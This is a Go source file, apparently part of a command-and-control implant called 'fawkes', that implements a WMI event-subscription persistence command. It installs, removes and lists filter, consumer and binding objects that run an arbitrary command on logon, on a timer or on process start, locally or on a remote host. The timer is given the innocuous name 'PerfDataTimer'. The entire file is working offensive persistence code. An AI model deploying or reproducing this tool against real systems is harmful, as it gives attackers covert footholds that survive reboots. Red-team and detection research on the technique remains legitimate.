//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

func (c *WmiPersistCommand) Execute(task structs.Task) structs.CommandResult {
	args, errResult := parseWmiPersistArgs(task)
	if errResult != nil {
		return *errResult
	}

	switch strings.ToLower(args.Action) {
	case "install":
		return wmiPersistInstall(args)
	case "remove":
		return wmiPersistRemove(args)
	case "list":
		return wmiPersistList(args)
	default:
		return errorf("Unknown action: %s\nAvailable: install, remove, list", args.Action)
	}
}

// wmiSubscriptionConnect connects to root\subscription namespace
func wmiSubscriptionConnect(target string) (*ole.IDispatch, *ole.IDispatch, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return nil, nil, nil, fmt.Errorf("CoInitializeEx failed: %v", err)
		}
	}

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("failed to create SWbemLocator: %v", err)
	}

	locator, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("failed to query IDispatch: %v", err)
	}

	server := ""
	if target != "" {
		server = `\\` + target
	}

	serviceResult, err := oleutil.CallMethod(locator, "ConnectServer", server, `root\subscription`)
	if err != nil {
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("ConnectServer failed (root\\subscription): %v", err)
	}
	services := serviceResult.ToIDispatch()

	cleanup := func() {
		services.Release()
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return locator, services, cleanup, nil
}

func wmiPersistInstall(args wmiPersistArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name parameter required (used as subscription identifier)")
	}
	if args.Command == "" {
		return errorResult("Error: command parameter required (executable path + arguments)")
	}
	if args.Trigger == "" {
		args.Trigger = "logon"
	}

	wqlQuery, err := buildWQLTrigger(args.Trigger, args.IntervalSec, args.ProcessName)
	if err != nil {
		return errorf("Error: %v", err)
	}

	_, services, cleanup, err := wmiSubscriptionConnect(args.Target)
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	filterName := args.Name + "_Filter"
	consumerName := args.Name + "_Consumer"

	// Step 1: Create __EventFilter
	filterResult, err := oleutil.CallMethod(services, "Get", "__EventFilter")
	if err != nil {
		return errorf("Error getting __EventFilter class: %v", err)
	}
	defer filterResult.Clear()

	filterClass := filterResult.ToIDispatch()
	filterInst, err := oleutil.CallMethod(filterClass, "SpawnInstance_")
	if err != nil {
		return errorf("Error spawning filter instance: %v", err)
	}
	defer filterInst.Clear()

	filterDisp := filterInst.ToIDispatch()
	for _, prop := range [][2]interface{}{
		{"Name", filterName}, {"QueryLanguage", "WQL"},
		{"Query", wqlQuery}, {"EventNamespace", `root\CIMV2`},
	} {
		if _, err := oleutil.PutProperty(filterDisp, prop[0].(string), prop[1]); err != nil {
			return errorf("Error setting filter %s: %v", prop[0], err)
		}
	}

	_, err = oleutil.CallMethod(filterDisp, "Put_")
	if err != nil {
		return errorf("Error creating event filter: %v", err)
	}

	// For interval trigger, also create a __IntervalTimerInstruction
	if strings.ToLower(args.Trigger) == "interval" {
		intervalMs := args.IntervalSec * 1000
		if intervalMs < 10000 {
			intervalMs = 300000
		}
		timerResult, err := oleutil.CallMethod(services, "Get", "__IntervalTimerInstruction")
		if err == nil {
			defer timerResult.Clear()
			timerClass := timerResult.ToIDispatch()
			timerInst, err := oleutil.CallMethod(timerClass, "SpawnInstance_")
			if err == nil {
				defer timerInst.Clear()
				timerDisp := timerInst.ToIDispatch()
				if _, err := oleutil.PutProperty(timerDisp, "TimerID", "PerfDataTimer"); err != nil {
					return errorf("Error setting timer TimerID: %v", err)
				}
				if _, err := oleutil.PutProperty(timerDisp, "IntervalBetweenEvents", intervalMs); err != nil {
					return errorf("Error setting timer IntervalBetweenEvents: %v", err)
				}
				if _, err := oleutil.CallMethod(timerDisp, "Put_"); err != nil {
					return errorf("Error creating timer instruction: %v", err)
				}
			}
		}
	}

	// Step 2: Create CommandLineEventConsumer
	consumerResult, err := oleutil.CallMethod(services, "Get", "CommandLineEventConsumer")
	if err != nil {
		return errorf("Error getting CommandLineEventConsumer class: %v", err)
	}
	defer consumerResult.Clear()

	consumerClass := consumerResult.ToIDispatch()
	consumerInst, err := oleutil.CallMethod(consumerClass, "SpawnInstance_")
	if err != nil {
		return errorf("Error spawning consumer instance: %v", err)
	}
	defer consumerInst.Clear()

	consumerDisp := consumerInst.ToIDispatch()
	if _, err := oleutil.PutProperty(consumerDisp, "Name", consumerName); err != nil {
		return errorf("Error setting consumer Name: %v", err)
	}
	if _, err := oleutil.PutProperty(consumerDisp, "CommandLineTemplate", args.Command); err != nil {
		return errorf("Error setting consumer CommandLineTemplate: %v", err)
	}

	_, err = oleutil.CallMethod(consumerDisp, "Put_")
	if err != nil {
		deleteWMIObject(services, "__EventFilter", filterName)
		return errorf("Error creating event consumer: %v", err)
	}

	// Step 3: Create __FilterToConsumerBinding
	bindingResult, err := oleutil.CallMethod(services, "Get", "__FilterToConsumerBinding")
	if err != nil {
		deleteWMIObject(services, "__EventFilter", filterName)
		deleteWMIObject(services, "CommandLineEventConsumer", consumerName)
		return errorf("Error getting __FilterToConsumerBinding class: %v", err)
	}
	defer bindingResult.Clear()

	bindingClass := bindingResult.ToIDispatch()
	bindingInst, err := oleutil.CallMethod(bindingClass, "SpawnInstance_")
	if err != nil {
		deleteWMIObject(services, "__EventFilter", filterName)
		deleteWMIObject(services, "CommandLineEventConsumer", consumerName)
		return errorf("Error spawning binding instance: %v", err)
	}
	defer bindingInst.Clear()

	bindingDisp := bindingInst.ToIDispatch()

	filterRef := fmt.Sprintf(`__EventFilter.Name="%s"`, filterName)
	consumerRef := fmt.Sprintf(`CommandLineEventConsumer.Name="%s"`, consumerName)
	if _, err := oleutil.PutProperty(bindingDisp, "Filter", filterRef); err != nil {
		deleteWMIObject(services, "__EventFilter", filterName)
		deleteWMIObject(services, "CommandLineEventConsumer", consumerName)
		return errorf("Error setting binding Filter: %v", err)
	}
	if _, err := oleutil.PutProperty(bindingDisp, "Consumer", consumerRef); err != nil {
		deleteWMIObject(services, "__EventFilter", filterName)
		deleteWMIObject(services, "CommandLineEventConsumer", consumerName)
		return errorf("Error setting binding Consumer: %v", err)
	}

	_, err = oleutil.CallMethod(bindingDisp, "Put_")
	if err != nil {
		deleteWMIObject(services, "__EventFilter", filterName)
		deleteWMIObject(services, "CommandLineEventConsumer", consumerName)
		return errorf("Error creating binding: %v", err)
	}

	host := "localhost"
	if args.Target != "" {
		host = args.Target
	}

	return successf("WMI Event Subscription installed on %s:\n"+
			"  Name:     %s\n"+
			"  Trigger:  %s\n"+
			"  Query:    %s\n"+
			"  Command:  %s\n"+
			"  Filter:   %s\n"+
			"  Consumer: %s\n"+
			"  Binding:  %s → %s\n\n"+
			"Subscription is persistent across reboots.",
			host, args.Name, args.Trigger, wqlQuery, args.Command,
			filterName, consumerName, filterRef, consumerRef)
}

func wmiPersistRemove(args wmiPersistArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name parameter required")
	}

	_, services, cleanup, err := wmiSubscriptionConnect(args.Target)
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	filterName := args.Name + "_Filter"
	consumerName := args.Name + "_Consumer"

	var sb strings.Builder
	errors := 0

	bindingPath := fmt.Sprintf(`__FilterToConsumerBinding.Filter="__EventFilter.Name=\"%s\"",Consumer="CommandLineEventConsumer.Name=\"%s\""`, filterName, consumerName)
	err = deleteWMIObjectByPath(services, bindingPath)
	if err != nil {
		sb.WriteString(fmt.Sprintf("Binding removal: %v\n", err))
		errors++
	} else {
		sb.WriteString("Binding removed\n")
	}

	err = deleteWMIObject(services, "CommandLineEventConsumer", consumerName)
	if err != nil {
		sb.WriteString(fmt.Sprintf("Consumer removal: %v\n", err))
		errors++
	} else {
		sb.WriteString("Consumer removed\n")
	}

	err = deleteWMIObject(services, "__EventFilter", filterName)
	if err != nil {
		sb.WriteString(fmt.Sprintf("Filter removal: %v\n", err))
		errors++
	} else {
		sb.WriteString("Filter removed\n")
	}

	deleteWMIObjectByPath(services, `__IntervalTimerInstruction.TimerID="PerfDataTimer"`)

	status := "success"
	if errors > 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("WMI Event Subscription removal for '%s':\n%s", args.Name, sb.String()),
		Status:    status,
		Completed: true,
	}
}

func wmiPersistList(args wmiPersistArgs) structs.CommandResult {
	_, services, cleanup, err := wmiSubscriptionConnect(args.Target)
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	var sb strings.Builder

	sb.WriteString("Event Filters\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	filters, err := wmiQuerySubscription(services, "SELECT Name, Query, QueryLanguage FROM __EventFilter")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	} else if len(filters) == 0 {
		sb.WriteString("  (none)\n")
	} else {
		for i, f := range filters {
			sb.WriteString(fmt.Sprintf("[%d] %s\n    Query: %s\n", i+1, f["Name"], f["Query"]))
		}
	}

	sb.WriteString("\nCommand Line Event Consumers\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	consumers, err := wmiQuerySubscription(services, "SELECT Name, CommandLineTemplate FROM CommandLineEventConsumer")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	} else if len(consumers) == 0 {
		sb.WriteString("  (none)\n")
	} else {
		for i, c := range consumers {
			sb.WriteString(fmt.Sprintf("[%d] %s\n    Command: %s\n", i+1, c["Name"], c["CommandLineTemplate"]))
		}
	}

	sb.WriteString("\nFilter-to-Consumer Bindings\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	bindings, err := wmiQuerySubscription(services, "SELECT Filter, Consumer FROM __FilterToConsumerBinding")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	} else if len(bindings) == 0 {
		sb.WriteString("  (none)\n")
	} else {
		for i, b := range bindings {
			sb.WriteString(fmt.Sprintf("[%d] %s → %s\n", i+1, b["Filter"], b["Consumer"]))
		}
	}

	return successResult(sb.String())
}

// wmiQuerySubscription runs a WQL query on root\subscription and returns results as maps
func wmiQuerySubscription(services *ole.IDispatch, wql string) ([]map[string]string, error) {
	resultSet, err := oleutil.CallMethod(services, "ExecQuery", wql)
	if err != nil {
		return nil, fmt.Errorf("ExecQuery failed: %v", err)
	}
	defer resultSet.Clear()

	var results []map[string]string
	resultDisp := resultSet.ToIDispatch()

	err = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		row := make(map[string]string)

		propsResult, err := oleutil.GetProperty(item, "Properties_")
		if err != nil {
			return err
		}
		defer propsResult.Clear()

		propsDisp := propsResult.ToIDispatch()
		oleutil.ForEach(propsDisp, func(pv *ole.VARIANT) error {
			prop := pv.ToIDispatch()
			nameResult, err := oleutil.GetProperty(prop, "Name")
			if err != nil {
				return nil
			}
			defer nameResult.Clear()

			valResult, err := oleutil.GetProperty(prop, "Value")
			if err != nil {
				return nil
			}
			defer valResult.Clear()

			name := nameResult.ToString()
			val := variantToString(valResult)
			if val != "" {
				row[name] = val
			}
			return nil
		})

		results = append(results, row)
		return nil
	})

	return results, err
}

// deleteWMIObject deletes a WMI object by class and name
func deleteWMIObject(services *ole.IDispatch, className, name string) error {
	path := fmt.Sprintf(`%s.Name="%s"`, className, name)
	return deleteWMIObjectByPath(services, path)
}

// deleteWMIObjectByPath deletes a WMI object by its full path
func deleteWMIObjectByPath(services *ole.IDispatch, path string) error {
	objResult, err := oleutil.CallMethod(services, "Get", path)
	if err != nil {
		return fmt.Errorf("object not found: %s", path)
	}
	defer objResult.Clear()

	objDisp := objResult.ToIDispatch()
	_, err = oleutil.CallMethod(objDisp, "Delete_")
	if err != nil {
		return fmt.Errorf("delete failed: %v", err)
	}
	return nil
}
